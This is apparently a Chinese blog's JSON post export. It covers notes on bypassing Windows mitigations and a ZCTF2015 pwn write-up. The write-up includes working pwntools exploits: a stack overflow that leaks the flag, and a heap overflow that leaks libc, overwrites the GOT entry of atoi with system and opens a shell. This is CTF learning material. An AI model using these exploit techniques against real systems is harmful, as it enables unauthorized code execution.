title=\"ASLR\"></a>ASLR</h4><ul>\n<li><p>与Linux上的ASLR稍有不同</p>\n<ul>\n<li>PE映像基址每次系统启动时不同</li>\n<li>TEB/PEB/heap/stack每次进程启动时不同</li>\n<li>同一个dll（某些，如ntdll.dll，kernel32.dll）的基址以第一次加载时固定，多个进程共享一个基址</li>\n</ul>\n</li>\n<li><p>Bypass</p>\n<ul>\n<li>地址信息泄露，可以通过pwn其他的进程</li>\n<li>brute-force (win7    x64,    win10    x86)</li>\n<li>Attack Non-ASLR images or top down alloc(win7)</li>\n<li>堆喷射/JIT</li>\n<li><a href=\"https://www.fireeye.com/blog/threat-research/2013/10/aslr-bypass-apocalypse-in-lately-zero-day-exploits.html\">Modifying the BSTR length/null terminator &amp; Modifying the Array object</a></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"CFG\"><a href=\"#CFG\" class=\"headerlink\" title=\"CFG\"></a><a href=\"http://101.96.10.27/sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf\">CFG</a></h4><ul>\n<li>所有的间接调用都会由一个事前定义的只读的bitmap来检查</li>\n<li>攻击虚表将成为历史（ppt上这里暂时不理解，应该是说所有的虚表调用都是会由CFG检查）</li>\n<li>Bypass<ul>\n<li><a href=\"https://www.blackhat.com/docs/us-15/materials/us-15-Zhang-Bypass-Control-Flow-Guard-Comprehensively.pdf\">Overwrite Guard CF Check Function Pointer</a></li>\n<li>覆写CFG未保护的地址（return address, SEH handler, etc.）</li>\n<li>覆写CFG禁用模块</li>\n<li><a href=\"http://syssec.rub.de/media/emma/veroeffentlichungen/2015/03/28/COOP-Oakland15.pdf\">COOP++</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"基于栈的缓解技术\"><a href=\"#基于栈的缓解技术\" class=\"headerlink\" title=\"基于栈的缓解技术\"></a>基于栈的缓解技术</h3><ul>\n<li>GS</li>\n<li>SafeSEH</li>\n<li>SEHOP<img src=\"http://images2015.cnblogs.com/blog/928323/201604/928323-20160424150111601-1948331326.png\" alt=\"GS\"></li>\n</ul>\n<h4 id=\"GS\"><a href=\"#GS\" class=\"headerlink\" title=\"GS\"></a>GS</h4><p>类似于Linux中的Canary</p>\n<ul>\n<li>Bypass<ul>\n<li>corrupt SEH(x86)</li>\n<li>Stack    underflow向前溢出</li>\n<li>nonlinear    write不顺序写，单打返回地址</li>\n<li>emm…没看懂下面两个大佬写的是什么</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://blog.pwnhub.cn/download/01/WinPWN.pdf\">WinPWN</a></li>\n<li><a href=\"http://www.cnblogs.com/flycat-2016/p/5426910.html\">Windows平台下的漏洞利用与防护</a></li>\n<li><a href=\"http://www.cnblogs.com/Danny-Wei/p/3766337.html\">Windows漏洞利用技术总结</a></li>\n<li><a href=\"https://www.xctf.org.cn/library/details/cbf49988610a48428addf58156ebed1434d162d5/\">XMan笔记</a></li>\n<li><a href=\"http://www.freebuf.com/articles/security-management/58373.html\">Win10安全特性之执行流保护</a></li>\n</ul>"},{"title":"Windows SEH覆盖","date":"2017-08-17T07:21:40.000Z","_content":"\n回想起上次GCTF的pwn没有做出来，再结合现在的漏洞研究趋势，多平台的漏洞挖掘才是实战的主流。\n在毕业前快些点上技能点吧，Windows、Linux、Mac、Android、IOS这些多少都要分析一遍。\n<!--more-->\n\n## SEH\n\n待补\n\n## 参考链接\n\n+ [栈溢出笔记1.9 认识SEH](http://blog.csdn.net/hustd10/article/details/51167902)\n+ [栈溢出笔记1.10 基于SEH的栈溢出](http://blog.csdn.net/hustd10/article/details/51167971)\n+ [Exploit开发系列教程-Mona 2& SEH](http://www.anquan.us/static/drops/tips-6814.html)","source":"_posts/Windows-SEH覆盖.md","raw":"---\ntitle: Windows SEH覆盖\ntags:\n  - PWN\n  - Win\n  - SEH\ncategories: []\ndate: 2017-08-17 15:21:40\n---\n\n回想起上次GCTF的pwn没有做出来，再结合现在的漏洞研究趋势，多平台的漏洞挖掘才是实战的主流。\n在毕业前快些点上技能点吧，Windows、Linux、Mac、Android、IOS这些多少都要分析一遍。\n<!--more-->\n\n## SEH\n\n待补\n\n## 参考链接\n\n+ [栈溢出笔记1.9 认识SEH](http://blog.csdn.net/hustd10/article/details/51167902)\n+ [栈溢出笔记1.10 基于SEH的栈溢出](http://blog.csdn.net/hustd10/article/details/51167971)\n+ [Exploit开发系列教程-Mona 2& SEH](http://www.anquan.us/static/drops/tips-6814.html)","slug":"Windows-SEH覆盖","published":1,"updated":"2017-08-17T07:29:01.880Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k2q003whv18oswz8axz","content":"<p>回想起上次GCTF的pwn没有做出来，再结合现在的漏洞研究趋势，多平台的漏洞挖掘才是实战的主流。<br>在毕业前快些点上技能点吧，Windows、Linux、Mac、Android、IOS这些多少都要分析一遍。<br><a id=\"more\"></a></p>\n<h2 id=\"SEH\"><a href=\"#SEH\" class=\"headerlink\" title=\"SEH\"></a>SEH</h2><p>待补</p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"http://blog.csdn.net/hustd10/article/details/51167902\" target=\"_blank\" rel=\"external\">栈溢出笔记1.9 认识SEH</a></li>\n<li><a href=\"http://blog.csdn.net/hustd10/article/details/51167971\" target=\"_blank\" rel=\"external\">栈溢出笔记1.10 基于SEH的栈溢出</a></li>\n<li><a href=\"http://www.anquan.us/static/drops/tips-6814.html\" target=\"_blank\" rel=\"external\">Exploit开发系列教程-Mona 2&amp; SEH</a></li>\n</ul>\n","excerpt":"<p>回想起上次GCTF的pwn没有做出来，再结合现在的漏洞研究趋势，多平台的漏洞挖掘才是实战的主流。<br>在毕业前快些点上技能点吧，Windows、Linux、Mac、Android、IOS这些多少都要分析一遍。<br></p>","more":"<p></p>\n<h2 id=\"SEH\"><a href=\"#SEH\" class=\"headerlink\" title=\"SEH\"></a>SEH</h2><p>待补</p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"http://blog.csdn.net/hustd10/article/details/51167902\">栈溢出笔记1.9 认识SEH</a></li>\n<li><a href=\"http://blog.csdn.net/hustd10/article/details/51167971\">栈溢出笔记1.10 基于SEH的栈溢出</a></li>\n<li><a href=\"http://www.anquan.us/static/drops/tips-6814.html\">Exploit开发系列教程-Mona 2&amp; SEH</a></li>\n</ul>"},{"title":"ZCTF2015 pwn","date":"2017-02-17T09:59:16.000Z","_content":"\n整理了一下ZCTF2015的pwn，看看出题思路。。\n\n## guess 100\n\n这个应该时之前ctftime上的一个比赛的题，应该时zctf借鉴的。。我觉得这次也很有可能会出之前比赛的题目\n\n```\npwndbg> checksec \n[*] '/home/ubuntu/ctf-problem/2015zctf/pwn/pwn1/guess'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE\n\n```\n\n有canary，但是有栈溢出，栈溢出后`__stack_check_fail`会打印程序的名字，也就是`argv[0]`的值，我们溢出修改`argv[0]`的值为之前加载到内存的`flag`的地址即可。\n[相关的ppt](http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf)\n\n断点在`fgets(&::s, v8 + 1, stream);`，也就是`.text:0000000000400A61                 call    _fgets`前\n\n```\n    fseek(stream, 0LL, 0);\n    fgets(&::s, v8 + 1, stream);\n    fclose(stream);\n```\n\ngdb查看得到加载的地址\n\n```\npwndbg> pd\n ► 0x400a61    call   fgets@plt                     <0x400800>\n        s: 0x6010c0 ◂— 0x0\n        n: 0x24\n        stream: 0x602010 ◂— 0xfbad2488\n \n   0x400a66    mov    rax, qword ptr [rbp - 0x48]\n   0x400a6a    mov    rdi, rax\n   0x400a6d    call   fclose@plt                    <0x4007a0>\n\n```\n\nexp如下，第一个用于获取`flag`长度，第二个用于攻击：\n\n```\nfrom pwn import *\n \n if __name__ == '__main__':\n     for i in range(40):\n         payload = i *'a'\n         p = process('./guess')\n         print p.recvuntil('\\n')\n         p.sendline(payload)\n         result = p.recvuntil('\\n')\n         if 'ZCTF' in result:\n             print 'len=', i\n             p.close()\n\t\t\t break\n         p.close()\n```\n\n```\nfrom pwn import *\n context.log_level = 'debug'\n \n s = process('./guess')\n s.recvuntil('please guess the flag:')\n payload='ZCTF{'+'A'*(32-5) + '\\x00' + 'a'*263 + p64(0x6010C5)\n s.sendline(payload)\n s.recvuntil('***: ')\n flagt = s.recvuntil('\\n')[:27]\n flag  = 'ZCTF{'\n for i in flagt:\n     flag += chr(ord(i)^ord('A'))\n print flag\n s.close()\n```\n\n## note1 200\n\nchecksec\n\n```\npwndbg> checksec \n[*] '/home/ubuntu/ctf-problem/2015zctf/pwn/pwn2/note1'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE\n```\n\n看了下程序，edit可以溢出修改到下一个note的指针，输出got表里puts的地址，因为这里的content是偏移了0x70位的，所以要减去0x70。最后修改atoi为system，输入/bin/sh\n\n但是有一个地方不明白，got表的高8byte是什么？\n\n```\n0x602018 <puts@got.plt>:\t0x00007ffff7a7d690\t0x0000000000400706\n0x602028 <printf@got.plt>:\t0x00007ffff7a63800\t0x00007ffff7ad9650\n0x602038 <read@got.plt>:\t0x00007ffff7b04670\t0x00007ffff7a2e740\n0x602048 <strcmp@got.plt>:\t0x00007ffff7aac9c0\t0x0000000000400766\n0x602058 <malloc@got.plt>:\t0x00007ffff7a91580\t0x00007ffff7a7de70\n0x602068 <atoi@got.plt>:\t0x00007ffff7a44e80\t0x00000000004007a6\n```\n\nexp:\n\n```\nfrom pwn import *\n\nDEBUG = 0\nif DEBUG:\n    context.log_level = 'debug'\n\nelf = ELF('./note1')\nlibc = ELF('libc.so.6')\n\natoi_got = elf.got['atoi']\nputs_got = elf.got['puts']\nputs_off = libc.symbols['puts']\nread_off = libc.symbols['read']\nsystem_off = libc.symbols['system']\n\np = process('./note1')\ndef new(title, types, content):\n    p.recvuntil('option--->>')\n    p.sendline('1')\n    p.recvuntil(':')\n    p.sendline(title)\n    p.recvuntil(':')\n    p.sendline(types)\n    p.recvuntil(':')\n    p.sendline(content)\n    return\n\ndef editnote(title,content):\n    p.recvuntil('option--->>')\n    p.sendline('3')\n    p.recvuntil(':')\n    p.sendline(title)\n    p.recvuntil(':')\n    p.sendline(content)\n    return\n\ndef shownote():\n    p.recvuntil('option--->>\\n')\n    p.sendline('2')\n    return\n\ndef main():\n    payload = (0x100 + 0x10)*'a'+p64(0)+p64(puts_got - 0x70)+'b'\n    new('a', 'aa', 'aaa')\n    new('b', 'bb', 'bbb')\n    editnote('a', payload)\n    shownote()\n    p.recvuntil('\\n')\n    p.recvuntil('content=')\n    buf = p.recvuntil('\\n')[:-1] + '\\x00\\x00'\n    puts = u64(buf)\n    print puts\n    libc_base = puts - puts_off\n    log.success('Libc base = ' + hex(libc_base))\n    read = libc_base + read_off\n    system = libc_base + system_off\n    new_got = p64(puts) + 'a'*24+p64(read)+'a'*40+p64(system)\n    editnote('',new_got)\n    p.sendline('/bin/sh')\n    p.interactive()\n    return 0\n\nif __name__ == '__main__':\n    main()\n```","source":"_posts/ZCTF2015-pwn.md","raw":"---\ntitle: ZCTF2015 pwn\ntags:\n  - PWN\n  - writeup\ncategories: []\ndate: 2017-02-17 17:59:16\n---\n\n整理了一下ZCTF2015的pwn，看看出题思路。。\n\n## guess 100\n\n这个应该时之前ctftime上的一个比赛的题，应该时zctf借鉴的。。我觉得这次也很有可能会出之前比赛的题目\n\n```\npwndbg> checksec \n[*] '/home/ubuntu/ctf-problem/2015zctf/pwn/pwn1/guess'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE\n\n```\n\n有canary，但是有栈溢出，栈溢出后`__stack_check_fail`会打印程序的名字，也就是`argv[0]`的值，我们溢出修改`argv[0]`的值为之前加载到内存的`flag`的地址即可。\n[相关的ppt](http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf)\n\n断点在`fgets(&::s, v8 + 1, stream);`，也就是`.text:0000000000400A61                 call    _fgets`前\n\n```\n    fseek(stream, 0LL, 0);\n    fgets(&::s, v8 + 1, stream);\n    fclose(stream);\n```\n\ngdb查看得到加载的地址\n\n```\npwndbg> pd\n ► 0x400a61    call   fgets@plt                     <0x400800>\n        s: 0x6010c0 ◂— 0x0\n        n: 0x24\n        stream: 0x602010 ◂— 0xfbad2488\n \n   0x400a66    mov    rax, qword ptr [rbp - 0x48]\n   0x400a6a    mov    rdi, rax\n   0x400a6d    call   fclose@plt                    <0x4007a0>\n\n```\n\nexp如下，第一个用于获取`flag`长度，第二个用于攻击：\n\n```\nfrom pwn import *\n \n if __name__ == '__main__':\n     for i in range(40):\n         payload = i *'a'\n         p = process('./guess')\n         print p.recvuntil('\\n')\n         p.sendline(payload)\n         result = p.recvuntil('\\n')\n         if 'ZCTF' in result:\n             print 'len=', i\n             p.close()\n\t\t\t break\n         p.close()\n```\n\n```\nfrom pwn import *\n context.log_level = 'debug'\n \n s = process('./guess')\n s.recvuntil('please guess the flag:')\n payload='ZCTF{'+'A'*(32-5) + '\\x00' + 'a'*263 + p64(0x6010C5)\n s.sendline(payload)\n s.recvuntil('***: ')\n flagt = s.recvuntil('\\n')[:27]\n flag  = 'ZCTF{'\n for i in flagt:\n     flag += chr(ord(i)^ord('A'))\n print flag\n s.close()\n```\n\n## note1 200\n\nchecksec\n\n```\npwndbg> checksec \n[*] '/home/ubuntu/ctf-problem/2015zctf/pwn/pwn2/note1'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE\n```\n\n看了下程序，edit可以溢出修改到下一个note的指针，输出got表里puts的地址，因为这里的content是偏移了0x70位的，所以要减去0x70。最后修改atoi为system，输入/bin/sh\n\n但是有一个地方不明白，got表的高8byte是什么？\n\n```\n0x602018 <puts@got.plt>:\t0x00007ffff7a7d690\t0x0000000000400706\n0x602028 <printf@got.plt>:\t0x00007ffff7a63800\t0x00007ffff7ad9650\n0x602038 <read@got.plt>:\t0x00007ffff7b04670\t0x00007ffff7a2e740\n0x602048 <strcmp@got.plt>:\t0x00007ffff7aac9c0\t0x0000000000400766\n0x602058 <malloc@got.plt>:\t0x00007ffff7a91580\t0x00007ffff7a7de70\n0x602068 <atoi@got.plt>:\t0x00007ffff7a44e80\t0x00000000004007a6\n```\n\nexp:\n\n```\nfrom pwn import *\n\nDEBUG = 0\nif DEBUG:\n    context.log_level = 'debug'\n\nelf = ELF('./note1')\nlibc = ELF('libc.so.6')\n\natoi_got = elf.got['atoi']\nputs_got = elf.got['puts']\nputs_off = libc.symbols['puts']\nread_off = libc.symbols['read']\nsystem_off = libc.symbols['system']\n\np = process('./note1')\ndef new(title, types, content):\n    p.recvuntil('option--->>')\n    p.sendline('1')\n    p.recvuntil(':')\n    p.sendline(title)\n    p.recvuntil(':')\n    p.sendline(types)\n    p.recvuntil(':')\n    p.sendline(content)\n    return\n\ndef editnote(title,content):\n    p.recvuntil('option--->>')\n    p.sendline('3')\n    p.recvuntil(':')\n    p.sendline(title)\n    p.recvuntil(':')\n    p.sendline(content)\n    return\n\ndef shownote():\n    p.recvuntil('option--->>\\n')\n    p.sendline('2')\n    return\n\ndef main():\n    payload = (0x100 + 0x10)*'a'+p64(0)+p64(puts_got - 0x70)+'b'\n    new('a', 'aa', 'aaa')\n    new('b', 'bb', 'bbb')\n    editnote('a', payload)\n    shownote()\n    p.recvuntil('\\n')\n    p.recvuntil('content=')\n    buf = p.recvuntil('\\n')[:-1] + '\\x00\\x00'\n    puts = u64(buf)\n    print puts\n    libc_base = puts - puts_off\n    log.success('Libc base = ' + hex(libc_base))\n    read = libc_base + read_off\n    system = libc_base + system_off\n    new_got = p64(puts) + 'a'*24+p64(read)+'a'*40+p64(system)\n    editnote('',new_got)\n    p.sendline('/bin/sh')\n    p.interactive()\n    return 0\n\nif __name__ == '__main__':\n    main()\n```","slug":"ZCTF2015-pwn","published":1,"updated":"2017-02-23T15:23:15.442Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k2t003yhv18o1r008li","content":"<p>整理了一下ZCTF2015的pwn，看看出题思路。。</p>\n<h2 id=\"guess-100\"><a href=\"#guess-100\" class=\"headerlink\" title=\"guess 100\"></a>guess 100</h2><p>这个应该时之前ctftime上的一个比赛的题，应该时zctf借鉴的。。我觉得这次也很有可能会出之前比赛的题目</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; checksec </div><div class=\"line\">[*] <span class=\"string\">'/home/ubuntu/ctf-problem/2015zctf/pwn/pwn1/guess'</span></div><div class=\"line\"><span class=\"attr\">    Arch:</span>     amd64<span class=\"bullet\">-64</span>-little</div><div class=\"line\"><span class=\"attr\">    RELRO:</span>    Partial RELRO</div><div class=\"line\"><span class=\"attr\">    Stack:</span>    Canary found</div><div class=\"line\"><span class=\"attr\">    NX:</span>       NX enabled</div><div class=\"line\"><span class=\"attr\">    PIE:</span>      <span class=\"literal\">No</span> PIE</div></pre></td></tr></table></figure>\n<p>有canary，但是有栈溢出，栈溢出后<code>__stack_check_fail</code>会打印程序的名字，也就是<code>argv[0]</code>的值，我们溢出修改<code>argv[0]</code>的值为之前加载到内存的<code>flag</code>的地址即可。<br><a href=\"http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf\" target=\"_blank\" rel=\"external\">相关的ppt</a></p>\n<p>断点在<code>fgets(&amp;::s, v8 + 1, stream);</code>，也就是<code>.text:0000000000400A61                 call    _fgets</code>前</p>\n<figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">fseek(<span class=\"name\">stream</span>, <span class=\"number\">0</span>LL, <span class=\"number\">0</span>)<span class=\"comment\">;</span></div><div class=\"line\">fgets(<span class=\"name\">&amp;</span>:<span class=\"symbol\">:s</span>, v8 + <span class=\"number\">1</span>, stream)<span class=\"comment\">;</span></div><div class=\"line\">fclose(<span class=\"name\">stream</span>)<span class=\"comment\">;</span></div></pre></td></tr></table></figure>\n<p>gdb查看得到加载的地址</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; pd</div><div class=\"line\"> ► <span class=\"number\">0x400a61</span>    <span class=\"keyword\">call</span>   fgets@plt                     &lt;<span class=\"number\">0x400800</span>&gt;</div><div class=\"line\"><span class=\"symbol\">        s:</span> <span class=\"number\">0x6010c0</span> ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"symbol\">        n:</span> <span class=\"number\">0x24</span></div><div class=\"line\"><span class=\"symbol\">        stream:</span> <span class=\"number\">0x602010</span> ◂— <span class=\"number\">0xfbad2488</span></div><div class=\"line\"> </div><div class=\"line\">   <span class=\"number\">0x400a66</span>    <span class=\"keyword\">mov</span>    <span class=\"built_in\">rax</span>, <span class=\"built_in\">qword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">rbp</span> - <span class=\"number\">0x48</span>]</div><div class=\"line\">   <span class=\"number\">0x400a6a</span>    <span class=\"keyword\">mov</span>    <span class=\"built_in\">rdi</span>, <span class=\"built_in\">rax</span></div><div class=\"line\">   <span class=\"number\">0x400a6d</span>    <span class=\"keyword\">call</span>   fclose@plt                    &lt;<span class=\"number\">0x4007a0</span>&gt;</div></pre></td></tr></table></figure>\n<p>exp如下，第一个用于获取<code>flag</code>长度，第二个用于攻击：</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"> </div><div class=\"line\"> <span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">     <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">40</span>):</div><div class=\"line\">         payload = i *<span class=\"string\">'a'</span></div><div class=\"line\">         p = <span class=\"built_in\">process</span>(<span class=\"string\">'./guess'</span>)</div><div class=\"line\">         print p.recvuntil(<span class=\"string\">'\\n'</span>)</div><div class=\"line\">         p.sendline(payload)</div><div class=\"line\">         <span class=\"built_in\">result</span> = p.recvuntil(<span class=\"string\">'\\n'</span>)</div><div class=\"line\">         <span class=\"keyword\">if</span> <span class=\"string\">'ZCTF'</span> <span class=\"keyword\">in</span> <span class=\"built_in\">result</span>:</div><div class=\"line\">             print <span class=\"string\">'len='</span>, i</div><div class=\"line\">             p.<span class=\"built_in\">close</span>()</div><div class=\"line\">\t\t\t break</div><div class=\"line\">         p.<span class=\"built_in\">close</span>()</div></pre></td></tr></table></figure>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn import *</div><div class=\"line\"> context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\"> </div><div class=\"line\"> s = process(<span class=\"string\">'./guess'</span>)</div><div class=\"line\"> s.recvuntil(<span class=\"string\">'please guess the flag:'</span>)</div><div class=\"line\"> payload=<span class=\"string\">'ZCTF&#123;'</span>+<span class=\"string\">'A'</span>*(<span class=\"number\">32</span>-<span class=\"number\">5</span>) + <span class=\"string\">'\\x00'</span> + <span class=\"string\">'a'</span>*<span class=\"number\">263</span> + p64(<span class=\"number\">0</span>x6010C5)</div><div class=\"line\"> s.sendline(payload)</div><div class=\"line\"> s.recvuntil(<span class=\"string\">'***: '</span>)</div><div class=\"line\"> flagt = s.recvuntil(<span class=\"string\">'\\n'</span>)[:<span class=\"number\">27</span>]</div><div class=\"line\"> <span class=\"built_in\">flag</span>  = <span class=\"string\">'ZCTF&#123;'</span></div><div class=\"line\"> <span class=\"keyword\">for</span> i <span class=\"built_in\">in</span> flagt:</div><div class=\"line\">     <span class=\"built_in\">flag</span> += chr(ord(i)^ord(<span class=\"string\">'A'</span>))</div><div class=\"line\"> print <span class=\"built_in\">flag</span></div><div class=\"line\"> s.close()</div></pre></td></tr></table></figure>\n<h2 id=\"note1-200\"><a href=\"#note1-200\" class=\"headerlink\" title=\"note1 200\"></a>note1 200</h2><p>checksec</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; checksec </div><div class=\"line\">[*] <span class=\"string\">'/home/ubuntu/ctf-problem/2015zctf/pwn/pwn2/note1'</span></div><div class=\"line\"><span class=\"attr\">    Arch:</span>     amd64<span class=\"bullet\">-64</span>-little</div><div class=\"line\"><span class=\"attr\">    RELRO:</span>    Partial RELRO</div><div class=\"line\"><span class=\"attr\">    Stack:</span>    Canary found</div><div class=\"line\"><span class=\"attr\">    NX:</span>       NX enabled</div><div class=\"line\"><span class=\"attr\">    PIE:</span>      <span class=\"literal\">No</span> PIE</div></pre></td></tr></table></figure>\n<p>看了下程序，edit可以溢出修改到下一个note的指针，输出got表里puts的地址，因为这里的content是偏移了0x70位的，所以要减去0x70。最后修改atoi为system，输入/bin/sh</p>\n<p>但是有一个地方不明白，got表的高8byte是什么？</p>\n<figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0x602018</span> &lt;puts@got.plt&gt;:\t<span class=\"number\">0</span>x00007ffff<span class=\"number\">7a7d690</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000400706</span></div><div class=\"line\"><span class=\"number\">0x602028</span> &lt;printf@got.plt&gt;:\t<span class=\"number\">0</span>x00007ffff<span class=\"number\">7a63800</span>\t<span class=\"number\">0</span>x00007ffff7ad9650</div><div class=\"line\"><span class=\"number\">0x602038</span> &lt;read@got.plt&gt;:\t<span class=\"number\">0</span>x00007ffff<span class=\"number\">7b04670</span>\t<span class=\"number\">0</span>x00007ffff<span class=\"number\">7a2e740</span></div><div class=\"line\"><span class=\"number\">0x602048</span> &lt;strcmp@got.plt&gt;:\t<span class=\"number\">0</span>x00007ffff7aac9c0\t<span class=\"number\">0</span>x00000<span class=\"number\">00000400766</span></div><div class=\"line\"><span class=\"number\">0x602058</span> &lt;malloc@got.plt&gt;:\t<span class=\"number\">0</span>x00007ffff<span class=\"number\">7a91580</span>\t<span class=\"number\">0</span>x00007ffff7a7de70</div><div class=\"line\"><span class=\"number\">0x602068</span> &lt;atoi@got.plt&gt;:\t<span class=\"number\">0</span>x00007ffff7a44e80\t<span class=\"number\">0</span>x000000<span class=\"number\">00004007a6</span></div></pre></td></tr></table></figure>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">DEBUG = <span class=\"number\">0</span></div><div class=\"line\"><span class=\"keyword\">if</span> DEBUG:</div><div class=\"line\">    context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./note1'</span>)</div><div class=\"line\">libc = ELF(<span class=\"string\">'libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</div><div class=\"line\">puts_got = elf.got[<span class=\"string\">'puts'</span>]</div><div class=\"line\">puts_off = libc.symbols[<span class=\"string\">'puts'</span>]</div><div class=\"line\">read_off = libc.symbols[<span class=\"string\">'read'</span>]</div><div class=\"line\">system_off = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\"></div><div class=\"line\">p = process(<span class=\"string\">'./note1'</span>)</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">new</span><span class=\"params\">(title, types, content)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'option---&gt;&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">    p.sendline(title)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">    p.sendline(types)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">    p.sendline(content)</div><div class=\"line\">    <span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> 